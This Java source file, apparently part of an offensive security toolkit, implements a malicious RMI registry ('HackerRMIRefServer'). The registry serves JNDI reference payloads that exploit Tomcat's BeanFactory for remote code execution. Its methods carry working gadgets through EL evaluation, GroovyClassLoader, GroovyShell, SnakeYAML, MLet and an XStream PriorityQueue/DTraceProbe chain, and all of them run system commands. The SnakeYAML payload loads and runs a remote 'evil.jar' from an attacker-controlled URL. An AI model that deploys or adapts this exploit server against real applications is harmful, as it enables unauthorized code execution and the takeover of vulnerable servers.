package com.github.enokiy.deserialization.utils;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.apache.naming.ResourceRef;

import javax.naming.NamingException;
import javax.naming.Reference;
import javax.naming.StringRefAddr;
import java.rmi.RemoteException;
import java.rmi.registry.Registry;

public class HackerRMIRefServer {


    public static void main(String[] args) throws Exception {
        Registry registry = new MyRegistryImpl(Constants.rmiPort);

        System.out.println(Constants.rmiUrl + "execByEL");
        registry.bind("execByEL", execByEL());

        System.out.println(Constants.rmiUrl + "execByGroovyClassLoader");
        registry.bind("execByGroovyClassLoader", execByGroovyClassLoader());

        System.out.println(Constants.rmiUrl + "execByGroovyShell");
        registry.bind("execByGroovyShell", execByGroovyShell());

        System.out.println(Constants.rmiUrl + "execByYaml");
        registry.bind("execByYaml", execByYaml());

        System.out.println(Constants.rmiUrl + "execByMLet");
        registry.bind("execByMLet", execByMLet());

        System.out.println(Constants.rmiUrl + "execByXstream");
        registry.bind("execByXstream", execByXstream());

    }

    public static ReferenceWrapper execByLow(String remote_class_server) throws RemoteException, NamingException {

        Reference ref = new Reference("org.CommonRef", "org.CommonRef", remote_class_server);
        return new ReferenceWrapper(ref);
    }

    public static ReferenceWrapper execByEL() throws RemoteException, NamingException {
        String payload = "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['cmd','/c','calc']).start()\")";
//        String payload = "Runtime.getRuntime().exec(\"calc\")";
        // Exploit with JNDI Reference with local factory Class EL
        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
        //redefine a setter name for the 'x' property from 'setX' to 'eval', see BeanFactory.getObjectInstance code
        ref.add(new StringRefAddr("forceString", "enokiy=eval"));
        //expression language to execute 'nslookup jndi.s.artsploit.com', modify /bin/sh to cmd.exe if you target windows
        ref.add(new StringRefAddr("enokiy", payload));
        // Reference包装类
        return new ReferenceWrapper(ref);
    }


    public static ReferenceWrapper execByGroovyClassLoader() throws RemoteException, NamingException {
        // Exploit with JNDI Reference with local factory Class Groovy
        ResourceRef ref = new ResourceRef("groovy.lang.GroovyClassLoader", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "x=parseClass"));
        String script = String.format("@groovy.transform.ASTTest(value={assert Runtime.getRuntime().exec(\"%s\")})\n" +
                "def y", new Object[]{Constants.cmd});
        ref.add(new StringRefAddr("x", script));
        return new ReferenceWrapper(ref);
    }

    //    groovy.lang.GroovyShell
    public static ReferenceWrapper execByGroovyShell() throws RemoteException, NamingException {
        // Exploit with JNDI Reference with local factory Class Groovy
        ResourceRef ref = new ResourceRef("groovy.lang.GroovyShell", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "x=evaluate"));
        String script = String.format("@groovy.transform.ASTTest(value={assert Runtime.getRuntime().exec(\"%s\")})\n" +
                "def y", new Object[]{Constants.cmd});
        ref.add(new StringRefAddr("x", script));
        return new ReferenceWrapper(ref);
    }

    //  snakeyaml
    public static ReferenceWrapper execByYaml() throws RemoteException, NamingException {
        // Exploit with JNDI Reference with local factory Class Groovy
        ResourceRef ref = new ResourceRef("org.yaml.snakeyaml.Yaml", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "x=load"));
        ref.add(new StringRefAddr("x", String.format("!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"%sevil.jar\"]]]]", new Object[]{Constants.httpUrl})));
        return new ReferenceWrapper(ref);
    }

    //    MLet 不能RCE，但是可以用来进行给gadgets探测：例如在不知道当前Classpath存在哪些可用的gadget时，就可以通过MLet进行第一次类加载，如果类加载成功就不会影响后面访问远程类。反之如果第一次类加载失败就会抛出异常结束后面的流程，也就不会访问远程类。
    public static ReferenceWrapper execByMLet() throws RemoteException, NamingException {
        ResourceRef ref = new ResourceRef("javax.management.loading.MLet", null, "", "",
                true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "a=loadClass,b=addURL,c=loadClass"));
        ref.add(new StringRefAddr("a", "javax.el.ELProcessor"));
        ref.add(new StringRefAddr("b", "http://127.0.0.1:8888/"));
        ref.add(new StringRefAddr("c", "Evil"));

        return new ReferenceWrapper(ref);
    }

    private static ReferenceWrapper execByXstream() throws NamingException, RemoteException {
        ResourceRef ref = new ResourceRef("com.thoughtworks.xstream.XStream", null, "", "",
                true, "org.apache.naming.factory.BeanFactory", null);
        String xml = "<java.util.PriorityQueue serialization='custom'>\n" +
        "  <unserializable-parents/>\n" +
                "  <java.util.PriorityQueue>\n" +
                "    <default>\n" +
                "      <size>2</size>\n" +
                "    </default>\n" +
                "    <int>3</int>\n" +
                "    <dynamic-proxy>\n" +
                "      <interface>java.lang.Comparable</interface>\n" +
                "      <handler class='sun.tracing.NullProvider'>\n" +
                "        <active>true</active>\n" +
                "        <providerType>java.lang.Comparable</providerType>\n" +
                "        <probes>\n" +
                "          <entry>\n" +
                "            <method>\n" +
                "              <class>java.lang.Comparable</class>\n" +
                "              <name>compareTo</name>\n" +
                "              <parameter-types>\n" +
                "                <class>java.lang.Object</class>\n" +
                "              </parameter-types>\n" +
                "            </method>\n" +
                "            <sun.tracing.dtrace.DTraceProbe>\n" +
                "              <proxy class='java.lang.Runtime'/>\n" +
                "              <implementing__method>\n" +
                "                <class>java.lang.Runtime</class>\n" +
                "                <name>exec</name>\n" +
                "                <parameter-types>\n" +
                "                  <class>java.lang.String</class>\n" +
                "                </parameter-types>\n" +
                "              </implementing__method>\n" +
                "            </sun.tracing.dtrace.DTraceProbe>\n" +
                "          </entry>\n" +
                "        </probes>\n" +
                "      </handler>\n" +
                "    </dynamic-proxy>\n" +
                "    <string>calc</string>\n" +
                "  </java.util.PriorityQueue>\n" +
                "</java.util.PriorityQueue>";
        ref.add(new StringRefAddr("forceString", "a=fromXML"));
        ref.add(new StringRefAddr("a", xml));
        return new ReferenceWrapper(ref);
    }
}
